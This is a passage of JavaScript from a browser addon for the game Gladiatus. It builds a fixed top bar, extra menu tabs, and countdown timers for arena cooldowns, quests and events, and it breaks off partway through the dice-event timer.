				link.setAttribute("target", "_blank");
				link.textContent = 'Gladiatus Crazy Addon v' + gca.version;
				div.appendChild(link);
				document.body.appendChild(div);
				
				// Set up scroll to top button
				var scroll_top = document.createElement('a');
				scroll_top.className = 'scroll-to-top';
				scroll_top.addEventListener('click', () => {
					jQuery('html, body').scrollTop(0);
					//or: window.scrollTo(0, 0)
				});
				scroll_top.textContent = ' ▲ ';
				div.appendChild(scroll_top);
				
				// Set up scroll to bottom button
				var bar = document.getElementById("mmonetbar");
				var scroll_bottom = document.createElement('a');
				scroll_bottom.className = 'scroll-to-bottom';
				scroll_bottom.textContent = ' ▼ ';
				scroll_bottom.addEventListener("click", function() {
					jQuery('html, body').scrollTop(jQuery("#footer_background").offset().top);
				});
				bar.appendChild(scroll_bottom);
				
				// Bind document elements
				this.elements.bar.dom = document.getElementById('topFixedBar');
				this.elements.icon_gold.dom = document.getElementById('icon_gold');
				this.elements.gold_val.dom = document.getElementById('sstat_gold_val');
				this.elements.icon_rubies.dom = document.getElementById('icon_rubies');
				this.elements.ruby_val.dom = document.getElementById('sstat_ruby_val');
				this.elements.icon_expeditionpoints.dom = document.getElementById('icon_expeditionpoints');
				this.elements.expeditionpoints_value.dom = document.getElementById('expeditionpoints_value');
				this.elements.icon_dungeonpoints.dom = document.getElementById('icon_dungeonpoints');
				this.elements.dungeonpoints_value.dom = document.getElementById('dungeonpoints_value');
				this.elements.header_values_ressources.dom = document.getElementById('header_values_ressources');
				this.elements.header_values_general.dom = document.getElementById('header_values_general');
				this.elements.icon_arena.dom = document.getElementById('icon_arena').parentNode;
				this.elements.icon_grouparena.dom = document.getElementById('icon_grouparena').parentNode;
				this.elements.header_values_hp.dom = document.getElementById('header_values_hp');
				this.elements.show_premium_days.dom = document.getElementById('show_premium_days');
				this.elements.header_menu.dom = document.getElementById('header_menue');
				
				// Attack a scroll event
				window.addEventListener("scroll", () => {
					this.onscroll();
				}, false);
				// Fire scroll event
				this.onscroll();
			},

			// On Page Scroll
			onscroll : function(){
				// Get scroll offset
				var vscroll = parseInt((document.all ? document.scrollTop : window.pageYOffset), 10);
				// For each element to be moved on the bar
				for(var i in this.elements){
					// If element exist
					if(this.elements[i].dom){
						// If scroll has passed the item
						if(vscroll>this.elements[i].scroll && this.elements[i].dom.name != "in-use"){
							this.elements[i].dom.className += " "+this.elements[i].className;
							this.elements[i].dom.name = "in-use";
						}
						// If scroll has not yet reached the item
						else if(vscroll<=this.elements[i].scroll && this.elements[i].dom.name == "in-use"){
							this.elements[i].dom.name = "no-use";
							this.elements[i].dom.className = this.elements[i].dom.className.replace(this.elements[i].className,"").replace("  "," ");
						}
					}
				}
			}
		},

		// Improve Main Menu
		advanced_main_menu : {
			loaded : false,
			info : {},

			// Resolve menu
			resolve : function() {
				if (this.loaded)
					return;
				this.loaded = true;

				// Get main menu links list
				var main_links = document.getElementById("mainmenu").getElementsByTagName('a');
				// Get submenu1 links list
				var sub_links = [];
				if(!gca_global.isTraveling){
					sub_links = document.getElementById("submenu1").getElementsByTagName('a');
					// Flag Submenus
					document.getElementById("submenu1").className = "submenu advanced_sub_menu";
					document.getElementById("submenu2").className = "submenu advanced_sub_menu";
				}

				// Overview Link
				this.info.overview = main_links[0];
				this.info.overview_active = (this.info.overview.className.match('active')) ? '_active' : '';

				// Hightscore Link
				this.info.highscore = main_links[3];
				this.info.highscore_active = (this.info.highscore.className.match('active')) ? '_active' : '';

				// Pantheon Link
				this.info.pantheon = main_links[1];
				this.info.pantheon_active = (this.info.pantheon.className.match('active')) ? '_active' : '';
				
				// Guild Link
				this.info.guild = main_links[2];
				this.info.guild_active = (this.info.guild.className.match('active')) ? '_active' : '';


				// While not traveling
				if(!gca_global.isTraveling){
					// Submenu links
					this.info.sublink = {
						work : {active : false},
						arena : {active : false},
						training : {active : false},
						weaponSmith : {active : false},
						armourSmith : {active : false},
						generalGoods : {active : false},
						alchemist : {active : false},
						mercenaries : {active : false},
						forge : {active : false},
						malefica : {active : false},
						wizard : {active : false},
						auction : {active : false},
						market : {active : false},
						cityGate : {active : false}
					};
					
					// Resolve links
					for(let i = 0; i < sub_links.length; i++){
						if(!this.info.sublink.work.active && sub_links[i].href.match(/index.php\?mod=work(&|&amp;)sh=/i)){
							this.info.sublink.work.active = i + 1;
							this.info.sublink.work.link = sub_links[i];
						}
						else if(!this.info.sublink.arena.active && sub_links[i].href.match(/index.php\?mod=arena(&|&amp;)sh=/i)){
							this.info.sublink.arena.active = i + 1;
							this.info.sublink.arena.link = sub_links[i];
						}
						else if(!this.info.sublink.training.active && sub_links[i].href.match(/index.php\?mod=training(&|&amp;)sh=/i)){
							this.info.sublink.training.active = i + 1;
							this.info.sublink.training.link = sub_links[i];
						}
						else if(!this.info.sublink.weaponSmith.active && sub_links[i].href.match(/index.php\?mod=inventory(&|&amp;)sub=1(&|&amp;)sh=/i)){
							this.info.sublink.weaponSmith.active = i + 1;
							this.info.sublink.weaponSmith.link = sub_links[i];
						}
						else if(!this.info.sublink.armourSmith.active && sub_links[i].href.match(/index.php\?mod=inventory(&|&amp;)sub=2(&|&amp;)sh=/i)){
							this.info.sublink.armourSmith.active = i + 1;
							this.info.sublink.armourSmith.link = sub_links[i];
						}
						else if(!this.info.sublink.generalGoods.active && sub_links[i].href.match(/index.php\?mod=inventory(&|&amp;)sub=3(&|&amp;)sh=/i)){
							this.info.sublink.generalGoods.active = i + 1;
							this.info.sublink.generalGoods.link = sub_links[i];
						}
						else if(!this.info.sublink.alchemist.active && sub_links[i].href.match(/index.php\?mod=inventory(&|&amp;)sub=4(&|&amp;)sh=/i)){
							this.info.sublink.alchemist.active = i + 1;
							this.info.sublink.alchemist.link = sub_links[i];
						}
						else if(!this.info.sublink.mercenaries.active && sub_links[i].href.match(/index.php\?mod=inventory(&|&amp;)sub=5(&|&amp;)sh=/i)){
							this.info.sublink.mercenaries.active = i + 1;
							this.info.sublink.mercenaries.link = sub_links[i];
						}
						else if(!this.info.sublink.forge.active && sub_links[i].href.match(/index.php\?mod=forge(&|&amp;)(submod=forge(&|&amp;))*sh=/i)){
							this.info.sublink.forge.active = i + 1;
							this.info.sublink.forge.link = sub_links[i];
						}
						else if(!this.info.sublink.malefica.active && sub_links[i].href.match(/index.php\?mod=inventory(&|&amp;)sub=6(&|&amp;)sh=/i)){
							this.info.sublink.malefica.active = i + 1;
							this.info.sublink.malefica.link = sub_links[i];
						}
						else if(!this.info.sublink.wizard.active && sub_links[i].href.match(/index.php\?mod=magus(&|&amp;)sh=/i)){
							this.info.sublink.wizard.active = i + 1;
							this.info.sublink.wizard.link = sub_links[i];
						}
						else if(!this.info.sublink.auction.active && sub_links[i].href.match(/index.php\?mod=auction(&|&amp;)sh=/i)){
							this.info.sublink.auction.active = i + 1;
							this.info.sublink.auction.link = sub_links[i];
						}
						else if(!this.info.sublink.market.active && sub_links[i].href.match(/index.php\?mod=market(&|&amp;)sh=/i)){
							this.info.sublink.market.active = i + 1;
							this.info.sublink.market.link = sub_links[i];
						}
					};

					// Arena
					if(this.info.sublink.arena.active){
						this.info.arena = this.info.sublink.arena.link;
						this.info.arena_active = (this.info.arena.className.match('active')) ? '_active' : '';
					}
					// Forge
					if(this.info.sublink.forge.active){
						this.info.forge = this.info.sublink.forge.link;
						this.info.forge_active = (this.info.forge.className.match('active')) ? '_active' : '';
					}
					// Malefica
					if(this.info.sublink.malefica.active){
						this.info.malefica = this.info.sublink.malefica.link;
						this.info.malefica_active = (this.info.malefica.className.match('active')) ? '_active' : '';
					}
					// Auction
					if(this.info.sublink.auction.active){
						this.info.auction = this.info.sublink.auction.link;
						this.info.auction_active = (this.info.auction.className.match('active')) ? '_active' : '';
					}
					// Market
					if(this.info.sublink.market.active){
						this.info.market = this.info.sublink.market.link;
						this.info.market_active = (this.info.market.className.match('active')) ? '_active' : '';
					}
					//WeaponSmith
					if(this.info.sublink.weaponSmith.active){
						this.info.weaponSmith = this.info.sublink.weaponSmith.link;
						this.info.weaponSmith_active = (this.info.weaponSmith.className.match('active')) ? '_active' : '';
					}
				}
			},

			// Tag main menu
			isTagged : false,
			tagMainMenu : function() {
				if (this.isTagged) return;
				this.isTagged = true;
				document.getElementById('mainmenu').className += " gca_advance_main_menu";
			},

			// Create Advance menu
			create : function(){
				// Tag menu
				this.tagMainMenu();
				// Resolve menu
				this.resolve();

				// Inject Overview Link
				this.convertMenu.addTabs("overview", this.info.overview, this.info.overview_active, [
					{text : 'P', href : gca_getPage.link({"mod":"overview","submod":"stats"})},
					{text : 'X', href : gca_getPage.link({"mod":"overview","doll":"2"})},
					{text : 'I', href : gca_getPage.link({"mod":"overview","doll":"3"})},
					{text : 'II', href : gca_getPage.link({"mod":"overview","doll":"4"})},
					{text : 'III', href : gca_getPage.link({"mod":"overview","doll":"5"})},
					{text : 'IV', href : gca_getPage.link({"mod":"overview","doll":"6"})}
				]);

				// Inject Highscore Link (old, not used)
				//this.convertMenu.addPlus(this.info.highscore, this.info.highscore_active, {href : gca_links.get('addon-page') + "/index.php?mode=highscore", target : "_blank"});

				// Inject Guild Highscore Link
				this.convertMenu.addPlus(this.info.highscore, this.info.highscore_active, {href : gca_getPage.link({"mod":"highscore","t":"1"})});
				
				// Inject Pantheon Link
				this.convertMenu.addTabs("pantheon", this.info.pantheon, this.info.pantheon_active, [
					{text : ''},
					{text : '\uD83D\uDCC4', href : gca_getPage.link({"mod":"quests"})},
					{text : '\u2714\uFE0F', href : gca_getPage.link({"mod":"missions"})},
					{text : '\u2728', href : gca_getPage.link({"mod":"gods"})},
					{text : '\uD83C\uDF81', href : gca_getPage.link({"mod":"mysterybox"})},
					{text : ''},
				]);

				// Inject Guild Link
				this.convertMenu.addTabs("guild", this.info.guild, this.info.guild_active, [
					{text : '\u265C', href : gca_getPage.link({"mod":"guild"})},
					{text : '\uD83D\uDD27', href : gca_getPage.link({"mod":"guild","submod":"admin"})},
					{text : '\uD83C\uDFF0', href : gca_getPage.link({"mod":"guild","submod":"buildings"})},
					{text : '\uD83D\uDCB2', href : gca_getPage.link({"mod":"guildBankingHouse"})},
					{text : '\u27F0', href : gca_getPage.link({"mod":"guild_jail"})},
					{text : '\u2719', href : gca_getPage.link({"mod":"guild_medic"})}
				]);

				// While not traveling
				if(!gca_global.isTraveling){

					// Player Level
					var level = parseInt(document.getElementById('header_values_level').textContent, 10);

					// If player over lvl 2
					if(level > 2){
						// Inject Arena link
						this.convertMenu.addPlus(this.info.arena, this.info.arena_active, {href : gca_getPage.link({"mod":"arena","submod":"grouparena"})});

						// Forge
						if(gca_options.bool("main_menu","menu_merge_items")){
							this.convertMenu.addTabs("forge",this.info.forge, this.info.forge_active,
							[
								{text : '', style : "width: 15px;"},
								{text : document.getElementById('submenu1').querySelectorAll('a[href^="index.php?mod=forge&submod=smeltery"]')[0].textContent, href : gca_getPage.link({"mod":"forge","submod":"smeltery"})},
								{text : document.getElementById('submenu1').querySelectorAll('a[href^="index.php?mod=forge&submod=workbench"]')[0].textContent, href : gca_getPage.link({"mod":"forge","submod":"workbench"})},
								{text : document.getElementById('submenu1').querySelectorAll('a[href^="index.php?mod=forge&submod=storage"]')[0].textContent, href : gca_getPage.link({"mod":"forge","submod":"storage"})},
								{text : document.getElementById('submenu1').querySelectorAll('a[href^="index.php?mod=magus"]')[0].textContent, href : gca_getPage.link({"mod":"magus"})},
								{text : '', style : "width: 15px;transform: scale(-1);"},
							]);
						}	
						
						/*
						// Malefica
						if(this.info.malefica){
							this.convertMenu.addPlus(this.info.malefica, this.info.malefica_active, {href : gca_getPage.link({"mod":"forge","submod":"workbench"})});
						}*/
						
						// Weapon smith
						if(gca_options.bool("main_menu","menu_merge_merchants")){
							this.convertMenu.addTabs("weaponSmith",this.info.weaponSmith, this.info.weaponSmith_active,
							[
								{text : document.getElementById('submenu1').querySelectorAll('a[href^="index.php?mod=inventory&sub=2"]')[0].textContent, href : gca_getPage.link({"mod":"inventory","sub":"2"})},
								{text : document.getElementById('submenu1').querySelectorAll('a[href^="index.php?mod=inventory&sub=3"]')[0].textContent, href : gca_getPage.link({"mod":"inventory","sub":"3"})},
								{text : document.getElementById('submenu1').querySelectorAll('a[href^="index.php?mod=inventory&sub=4"]')[0].textContent, href : gca_getPage.link({"mod":"inventory","sub":"4"})},
								{text : document.getElementById('submenu1').querySelectorAll('a[href^="index.php?mod=inventory&sub=5"]')[0].textContent, href : gca_getPage.link({"mod":"inventory","sub":"5"})},
								{text : document.getElementById('submenu1').querySelectorAll('a[href^="index.php?mod=inventory&sub=6"]')[0].textContent, href : gca_getPage.link({"mod":"inventory","sub":"6"})},
							]);
						}
						// Auction menu links
						if(this.info.auction){
							this.convertMenu.addPlus(this.info.auction, this.info.auction_active, {href : gca_getPage.link({"mod":"auction","ttype":"3"})});
							this.convertMenu.addTabs("auction",this.info.auction, this.info.auction_active,
							[
								{href : gca_getPage.link({"mod":"auction","itemType":"6"}), img : {class : "item-i-6-6", style : "margin:-2px;"}},
								{href : gca_getPage.link({"mod":"auction","itemType":"9"}), img : {class : "item-i-9-7", style : "margin:-2px;"}},
								{href : gca_getPage.link({"mod":"auction","itemType":"11"}), img : {class : "item-i-11-3", style : "margin:-2px;"}},
								{href : gca_getPage.link({"mod":"auction","itemType":"12"}), img : {class : "item-i-12-14", style : "margin:-2px;"}},
								{href : gca_getPage.link({"mod":"auction","itemType":"15"}), img : {class : "item-i-15-15", style : "margin:-2px;"}}
							]);
						}
						// Inject Market Link
						if(this.info.market){
							this.convertMenu.addTabs("market", this.info.market, this.info.market_active, [
								{href : gca_getPage.link({"mod":"market","f":"7","s":"p"}), img : {class : "item-i-7-2", style : "margin:-2px;"}},
								{href : gca_getPage.link({"mod":"market","f":"12","s":"p"}), img : {class : "item-i-12-8", style : "margin:-2px;"}},
								{href : gca_getPage.link({"mod":"market","f":"11","s":"p"}), img : {class : "item-i-11-7", style : "margin:-2px;"}},
								{href : gca_getPage.link({"mod":"market","f":"18","s":"p"}), img : {class : "item-i-18-49", style : "margin:-2px;"}},
								{href : gca_getPage.link({"mod":"market","f":"20","s":"p"}), img : {class : "item-i-20-11", style : "margin:-2px;"}}
							]);
						}
					}

					// lv2 player
					else if(level == 2){
						// Inject Arena link
						this.convertMenu.addPlus(this.info.arena, this.info.arena_active, {href : gca_getPage.link({"mod":"arena","submod":"grouparena"})});
					}
				}
			},

			convertMenu : {
				// Add a + button
				addPlus : function(menu, active, options){
					// Inject parent wrapper
					var newMenu = document.createElement("div");
					newMenu.className = "advanced_menu_entry";
					menu.parentNode.insertBefore(newMenu, menu.nextSibling);
					newMenu.appendChild(menu);
					menu.className += " advanced_menu_link" + active;
					menu.dataset.hasWrapper = "true";
					// Plus Link
					var a = document.createElement("a");
					a.className = "advanced_menu_shift";
					a.textContent = ">";
					a.style.fontFamily = "Consolas, monaco, monospace";
					for(let i in options){
						a.setAttribute(i,options[i]);
					}
					newMenu.appendChild(a);
					return a;
				},

				// Add a back Tab
				addTabs : function(name, menu, active, links){
					// Front Tab
					// Check if front tab exists (tabs to be added on the left side)
					var frontTab;
					var existingTab = null;
					if (menu.parentNode.className == "advanced_menu_entry"){
						frontTab = menu.parentNode;
						//frontTab.className += " advanced_menu_shift_left";
						existingTab = frontTab.getElementsByClassName("advanced_menu_shift")[0];
					}else{
						frontTab = document.createElement("div");
						frontTab.className = "advanced_menu_entry";
						menu.parentNode.insertBefore(frontTab, menu.nextSibling);
					}
					menu.dataset.hasWrapper = "true";
					// Back Tab
					var backTab = document.createElement("div");
					backTab.className = "advanced_menu_back_links";
					backTab.style.display = "none";

					var backLinks = [];
					// Back Tab links
					for(let i = 0; i<links.length; i++){
						let a = document.createElement("a");
						if(links[i].img){
							let img = document.createElement("div");
							for(let j in links[i].img){
								img.setAttribute(j, links[i].img[j]);
							}
							a.appendChild(img);
							delete links[i].img;
						}
						if(links[i].text){
							a.textContent = links[i].text;
							delete links[i].text;
						}
						for(let j in links[i]){
							a.setAttribute(j, links[i][j]);
						}
						backTab.appendChild(a);
						backLinks.push(a);
					}
					if(frontTab != menu.parentNode){
						frontTab.appendChild(menu);
						menu.className += " advanced_menu_link" + active;
					}else{
						menu.className += " advanced_menu_link_multiple" + active;
					}
					frontTab.appendChild(backTab);
					// Tab Toggle
					var a = document.createElement("a");
					a.className = "advanced_menu_shift";
					a.textContent = "+";
					a.addEventListener('click',function(){
						if(backTab.style.display == 'none'){
							jQuery(menu).hide();
							jQuery(backTab).show();
							if(existingTab!=null)
								jQuery(existingTab).hide();
							gca_data.section.set("advanced-menu", name + "-tab", true);
						}
						else{
							jQuery(backTab).hide();
							jQuery(menu).show();
							if(existingTab!=null)
								jQuery(existingTab).show();
							gca_data.section.set("advanced-menu", name + "-tab", false);
						}
					},false);
					frontTab.appendChild(a);
					backLinks.push(a);

					if(gca_data.section.get("advanced-menu", name + "-tab", false)){
						jQuery(menu).hide();
						jQuery(backTab).show();
						if(existingTab!=null)
							jQuery(existingTab).hide();
					}
					
					// Style fixes for multiple tabs (>, +)
					if(existingTab!=null){
						backTab.className += " advanced_menu_back_links_left";
						a.className += " advanced_menu_shift_left";
					}

					return backLinks;
				},

				// Add a side icon
				addSideIcon : function(menu, active, icon){
					// Inject parent wrapper
					var menuWrapper
					if (!menu.dataset.hasWrapper) {
						menuWrapper = document.createElement("div");
						menuWrapper.className = "advanced_menu_entry";
						menu.parentNode.insertBefore(menuWrapper, menu.nextSibling);
						menuWrapper.appendChild(menu);
					} else {
						menuWrapper = menu.parentNode;
					}
					// Side icon
					var i = document.createElement("span");
					i.className = "advanced_menu_side_icon";
					if (icon) i.className += " " + icon;
					menuWrapper.appendChild(i);
					return i;
				},
			},
			
			// Convert mouseover submenu change event to click event
			submenuClickToChangeTab : {
				// Apply change
				apply : function(){
					// If you travel, return
					if(gca_global.isTraveling)
						return;

					// Town Menu Tab
					let tab = document.getElementById("submenuhead1").getElementsByTagName('div')[1];
					tab.removeAttribute("onmouseover");
					tab.setAttribute("onclick", "switchMenu(2)");
					tab.style.cursor = "pointer";
					tab.getElementsByTagName('a')[0].removeAttribute("href");
					// Expedition Menu Tab
					tab = document.getElementById("submenuhead2").getElementsByTagName('div')[0];
					tab.removeAttribute("onmouseover");
					tab.setAttribute("onclick", "switchMenu(1)");
					tab.style.cursor = "pointer";
					tab.getElementsByTagName('a')[0].removeAttribute("href");

					// Enable it
					document.documentElement.className = document.documentElement.className.replace(/\s*gca_submenu_change_disable/i,"");
				},
				// Css hack on preload
				preload : function(){
					// Add css rule on HTML
					document.documentElement.className += " gca_submenu_change_disable";
					// Not perfect, but the best we can do
				}
			}
		},

		// Attacked timers
		attacked_timers : {
			inject : function(){
				// if reports wait for update event
				if(gca_section.mod == 'reports' && (gca_section.submod == 'showArena' || gca_section.submod == 'showCircusTurma' || gca_getPage.parameter('t') == '2' || gca_getPage.parameter('t') == '3') && document.getElementById('content').getElementsByClassName('report_statistic')){
					gca_tools.event.addListener("arena-info-update", () => {
						this.display();
					});
					return;
				}

				this.display();
			},

			// Arena Timer Elements
			arenaTimeElement : {
				arena : null,
				grouparena : null,
				arena_xs : null,
				grouparena_xs : null
			},
			// Arena Timer Values
			timer : {
				arena : null,
				grouparena : null,
				arena_xs : null,
				grouparena_xs : null
			},

			// Display timers
			display : function(){
				// Style fixes
				document.getElementById("header_menue").className = "attacked_timers_active";
				// Get Last arena attack
				var lastAttacked = {
					// Arena
					arena : parseInt(gca_data.section.get("timers", 'arena_attacked', 0), 10),
					// Grouparena
					grouparena : parseInt(gca_data.section.get("timers", 'grouparena_attacked', 0), 10),
					// Arena xs
					arena_xs : parseInt(gca_data.section.get("timers", 'arena_xs_attacked', 0), 10),
					// Grouparena xs
					grouparena_xs : parseInt(gca_data.section.get("timers", 'grouparena_xs_attacked', 0), 10)
				};

				// Create timers UI
				this.createUI();

				// Calculate timers values
				this.timer.arena = gca_tools.time.server() - lastAttacked.arena;
				this.timer.grouparena = gca_tools.time.server() - lastAttacked.grouparena;
				this.timer.arena_xs = gca_tools.time.server() - lastAttacked.arena_xs;
				this.timer.grouparena_xs = gca_tools.time.server() - lastAttacked.grouparena_xs;

				// Timers countdowns
				this.countdown_started = new Date().getTime();
				setInterval(() => {
					this.countdown();
				}, 1000);
				this.countdown();
			},

			// Count Down
			countdown_started : null,
			countdown : function(){
				let passed = new Date().getTime() - this.countdown_started;
				this.arenaTimeElement.arena.textContent = this.countdown_msToHMS(this.timer.arena + passed);
				this.arenaTimeElement.grouparena.textContent = this.countdown_msToHMS(this.timer.grouparena + passed);
				this.arenaTimeElement.arena_xs.textContent = this.countdown_msToHMS(this.timer.arena_xs + passed);
				this.arenaTimeElement.grouparena_xs.textContent = this.countdown_msToHMS(this.timer.grouparena_xs + passed);
			},
			countdown_msToHMS : function(timer) {
				return gca_tools.time.msToHMS_String(timer > 0 ? timer : 0);
			},

			// Create timers ui
			createUI : function(){
				// Variables
				var tr, td, icon, text;

				// Create timers container
				var container = document.createElement("div");
				container.className = "attacked_timers_back";
				// Insert timer table
				var table = document.createElement("table");
				table.id = "attacked_timers_table";
				table.className = "attacked_timers_table";
				tr = document.createElement("tr");

				// Arena Timer Cell
				td = document.createElement("td");
				icon = document.createElement("span");
				icon.className = "timer-icon timer-icon-arena";
				this.arenaTimeElement.arena = document.createElement("span");
				this.arenaTimeElement.arena.className = "timer";
				td.appendChild(icon);
				td.appendChild(this.arenaTimeElement.arena);
				tr.appendChild(td);
				
				// Grouparena Timer
				td = document.createElement("td");
				icon = document.createElement("span");
				icon.className = "timer-icon timer-icon-grouparena";
				this.arenaTimeElement.grouparena = document.createElement("span");
				this.arenaTimeElement.grouparena.className = "timer";
				td.appendChild(icon);
				td.appendChild(this.arenaTimeElement.grouparena);
				tr.appendChild(td);
				table.appendChild(tr);

				tr = document.createElement("tr");

				// Arena xs Timer
				td = document.createElement("td");
				icon = document.createElement("span");
				icon.className = "timer-icon timer-icon-arena";
				text = document.createElement("span");
				text.className = "attacked_timers_xs_text";
				text.textContent = "s";
				this.arenaTimeElement.arena_xs = document.createElement("span");
				this.arenaTimeElement.arena_xs.className = "timer";
				td.appendChild(icon);
				td.appendChild(text);
				td.appendChild(this.arenaTimeElement.arena_xs);
				tr.appendChild(td);

				// Grouparena xs Timer
				td = document.createElement("td");
				icon = document.createElement("span");
				icon.className = "timer-icon timer-icon-grouparena";
				text = document.createElement("span");
				text.className = "attacked_timers_xs_text";
				text.textContent = "s";
				this.arenaTimeElement.grouparena_xs = document.createElement("span");
				this.arenaTimeElement.grouparena_xs.className = "timer";
				td.appendChild(icon);
				td.appendChild(text);
				td.appendChild(this.arenaTimeElement.grouparena_xs);
				tr.appendChild(td);

				// Insert on page
				table.appendChild(tr);
				container.appendChild(table);
				document.getElementById("header_game").appendChild(container);
			}
		},

		// Timer for the Quests
		quests_timer : {
			inject : function(){
				// Do not run while traveling
				if (gca_global.isTraveling) return;
				
				// if Quests wait for update event
				if (gca_section.mod == 'quests') {
					gca_tools.event.addListener("quest-info-update", () => {
						this.display();
					});
					return;
				}

				this.display();
			},

			// Display timers
			display : function(){
				// Time when quests will be refreshed
				var nextAvailable = parseInt(gca_data.section.get("timers", 'quest_available', 0), 10);
				// Quest free slots
				this.quests_free_slots = parseInt(gca_data.section.get("timers", 'quests_free_slots', '-1'), 10);

				// Get menu
				var menu;
				if(document.getElementsByClassName('advanced_menu_entry').length > 0){
					menu = document.getElementsByClassName('advanced_menu_entry')[1].getElementsByTagName('a')[0];
				}
				else{
					menu = document.getElementById('mainmenu').getElementsByTagName('a')[1];
				}

				// If quest completed
				var quest_completed = menu.textContent.match(/\s*\((\d+)\)/i);
				if(quest_completed){
					// Remove indicator
					menu.textContent = menu.textContent.replace(quest_completed[0],'');
					// Append a new indicator
					menu.appendChild(document.createTextNode(" ("));
					let font = document.createElement("font");
					font.setAttribute("color", "green");
					font.textContent = quest_completed[1];
					menu.appendChild(font);
					menu.appendChild(document.createTextNode(")"));
				}

				// Create timer
				this.questTimeElement = document.createElement("font");
				this.questTimeElement.id = "QuestTime";
				this.questTimeElement.style = "margin-left:5px;font-weight:bold;";
				this.questTimeElement.textContent = "(N/A)";
				menu.appendChild(this.questTimeElement);

				// Time difference
				this.timer = (nextAvailable - gca_tools.time.server());
				// Check if the time has finished
				if(this.timer < 0){
					// Can i take quests?
					if(this.quests_free_slots == 0){
						this.questTimeElement.textContent = "";
						this.questTimeElement.appendChild(document.createTextNode("("));
						let font = document.createElement("font");
						font.setAttribute("color", "red");
						font.textContent = gca_locale.get("global", "quest_full");
						this.questTimeElement.appendChild(font);
						this.questTimeElement.appendChild(document.createTextNode(")"));
					}
					// Do i have data saved? (-1 is the default value)
					else if(this.quests_free_slots != -1){
						this.questTimeElement.textContent = "";
						this.questTimeElement.appendChild(document.createTextNode("("));
						let font = document.createElement("font");
						font.setAttribute("color", "yellow");
						font.textContent = gca_locale.get("global", "quest_new");
						this.questTimeElement.appendChild(font);
						this.questTimeElement.appendChild(document.createTextNode(")"));
					}
				}
				// Time has NOT finished
				else {
					// Refresh the countdown
					this.countdown_started = new Date().getTime();
					this.countdown_interval = setInterval(() => {
						this.countdown();
					}, 500);
					this.countdown();
				}
			},

			// Count Down
			countdown_started : null,
			countdown_interval : null,
			countdown : function(){
				var timer = this.timer - (new Date().getTime() - this.countdown_started);
				// If ready
				if (timer < 0) {
					if (this.quests_free_slots == 0) {
						this.questTimeElement.textContent = "(" + gca_locale.get("global", "quest_full") + ")";
					}
					else {
						this.questTimeElement.textContent = "(" + gca_locale.get("global", "quest_new") + ")";
					}
					this.questTimeElement.style.color = "yellow";

					// Clear timer
					clearInterval(this.countdown_interval);
					return;
				}

				// Convert milliseconds to Minutes:Seconds
				var date = new Date(timer);
				var minutes = date.getMinutes();
				var seconds = date.getSeconds();
				// Format to 01:04
				if(minutes < 10){minutes = '0'+minutes;}
				if(seconds < 10){seconds = '0'+seconds;}

				// Display the values
				this.questTimeElement.textContent = '(' + minutes + ':' + seconds + ')';
			}
		},
		
		// Global Arena
		global_arena : {
			inject : function(){
				// Do not run while traveling
				//if (gca_global.isTraveling) return;
				
				// if Quests wait for update event
				/*
				if (gca_section.mod == 'arena' && gca_section.submod == null) {
					gca_tools.event.addListener("quest-info-update", () => {
						this.display();
					});
					return;
				}*/

				this.display();
			},

			// Display timer
			display : function(){
				// Time when ready to attack
				var nextAvailable = parseInt(gca_data.section.get("timers", 'global_arena', 0), 10);
				// Time difference
				this.timer = (nextAvailable - new Date().getTime());
				// Global Arena Position
				this.global_arena_position = gca_data.section.get("timers", 'global_arena_position', 'n/a');
				if ( isNaN(this.global_arena_position) || this.global_arena_position <= 0 )
					this.global_arena_position = 'n/a';

				// Change Style
				document.getElementById('header_game').className += " gca-global-arena-timer-on";

				// Create timer
				let gaCooldownBar = document.createElement("div");
				gaCooldownBar.id = "cooldown_bar_ga";
				gaCooldownBar.className = "cooldown_bar global_arena_global_timer";
				gaCooldownBar.dataset.tooltip = '[[["'+gca_locale.get("arena", "global_arena_title")+' : '+this.global_arena_position+'","#fdfdfd"]]]';
				gaCooldownBar.style.display = 'none';
				this.globalArenaCooldownProgressBar = document.createElement("div");
				this.globalArenaCooldownProgressBar.className = "cooldown_bar_fill cooldown_bar_fill_"+( this.timer <= 0 ? "ready" : "progress" );
				this.globalArenaCooldownProgressBar.id = "cooldown_bar_fill_ga";
				this.globalArenaCooldownProgressBar.style = "width: 100%;";
				gaCooldownBar.appendChild(this.globalArenaCooldownProgressBar);
				this.globalArenaCooldownText = document.createElement("div");
				this.globalArenaCooldownText.className = "cooldown_bar_text";
				this.globalArenaCooldownText.id = "cooldown_bar_text_ga";
				this.globalArenaCooldownText.textContent = gca_global.isTraveling ? "-" : gca_locale.get("arena", "global_arena_title");
				gaCooldownBar.appendChild(this.globalArenaCooldownText);
				let a = document.createElement("a");
				a.className = "cooldown_bar_link";
				a.href = gca_getPage.link({"mod":"arena"})+"#global_arena_box";
				gaCooldownBar.appendChild(a);
				document.getElementById('header_game').appendChild(gaCooldownBar);
				
				// Check if the time has finished
				if(this.timer > 0){
					// Time has NOT finished
					
					// Refresh the countdown
					this.countdown_started = new Date().getTime();
					this.countdown_interval = setInterval(() => {
						this.countdown();
					}, 500);
					this.countdown();
				}
			},

			// Count Down
			countdown_started : null,
			countdown_interval : null,
			countdown : function(){
				var timer = this.timer - (new Date().getTime() - this.countdown_started);
				
				// If ready
				if (timer < 0) {
					this.globalArenaCooldownText.textContent = gca_locale.get("arena", "global_arena_title");
					this.globalArenaCooldownProgressBar.className = "cooldown_bar_fill cooldown_bar_fill_ready";

					// Clear timer
					clearInterval(this.countdown_interval);
					return;
				}
				
				this.globalArenaCooldownProgressBar.style = "width: "+ (1-timer/(10*60*1000))*100 +"%;";

				// Convert milliseconds to Minutes:Seconds
				var date = new Date(timer);
				var minutes = date.getMinutes();
				var seconds = date.getSeconds();
				// Format to 01:04
				if(minutes < 10){minutes = '0'+minutes;}
				if(seconds < 10){seconds = '0'+seconds;}

				// Display the values
				this.globalArenaCooldownText.textContent = '0:' + minutes + ':' + seconds;
			}
		},

		// Events
		event : {
			// Craps Event Timer (Dice roll event)
			craps_timer : {
				inject : function(){
					// Do not run while traveling
					if (gca_global.isTraveling) return;

					// if Craps wait for update event
					if(gca_section.mod == 'craps'){
						gca_tools.event.addListener('craps-info-update', () => {
							this.reset();
						});
						return;
					}

					this.display();
				},

				// Display timers
				display : function(){
					// Already running
					if(this.crapsTimeElement)
						return;

					// Time when craps will be refreshed
					var nextAvailable = parseInt(gca_data.section.get("timers", 'craps_available', 0), 10);
					// Craps free toss
					this.craps_free_toss = parseInt(gca_data.section.get("timers", 'craps_free_toss', '-1'), 10);

					// Get link
					var link = document.getElementById('submenu1').getElementsByTagName('a')[0];

